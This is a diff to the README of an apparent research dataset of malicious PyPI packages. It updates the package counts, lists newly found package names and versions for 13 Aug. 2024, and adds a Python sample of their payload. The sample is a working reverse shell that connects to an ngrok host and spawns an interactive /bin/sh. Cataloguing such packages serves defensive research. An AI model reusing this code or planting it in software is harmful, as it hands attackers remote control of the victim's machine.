@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 7,472 versions of the source code of 6,134 malicious packages.
+This data set includes about 7,497 versions of the source code of 6,137 malicious packages.
 
 ## Dataset Format
 
@@ -1164,6 +1164,38 @@ aiohttp-async-proxy [0.1.72, 0.1.73] <br>
 ai-http-proxy [0.1.2] <br>
 typing-unions [3.10.0.1, 3.10.0.0] <br>
 
+
+### 13 Aug. 2024
+django_mongodb [5.0a4] <br>
+artifact-lab-3-package-f0727516 [0.1.0, 0.1.1] <br>
+artifact-lab-3-package-392c6acd [0.1.1, 0.1.10, 0.1.12, 0.1.13, 0.1.14, 0.1.15, 0.1.16, 0.1.17, 0.1.18, 0.1.19, 0.1.2, 0.1.20, 0.1.22, 0.1.23, 0.1.24, 0.1.3, 0.1.4, 0.1.5, 0.1.6, 0.1.7, 0.1.8, 0.1.9] <br>
+
+```python
+def reverse_shell():
+    host = "6.tcp.eu.ngrok.io"  # Replace with your IP
+    port = 13334  # Replace with your port
+
+    try:
+        # Create a socket object
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        
+        # Connect to the remote server
+        s.connect((host, port))
+        
+        # Redirect standard input, output, and error to the socket
+        os.dup2(s.fileno(), 0)
+        os.dup2(s.fileno(), 1)
+        os.dup2(s.fileno(), 2)
+        
+        # Execute a shell using a more portable approach
+        p = subprocess.call(["/bin/sh", "-i"])
+        
+    except Exception as e:
+        print(f"Error: {e}")
+
+# Call the function
+reverse_shell()
+```
 
 ## About the malicious packages detection
 
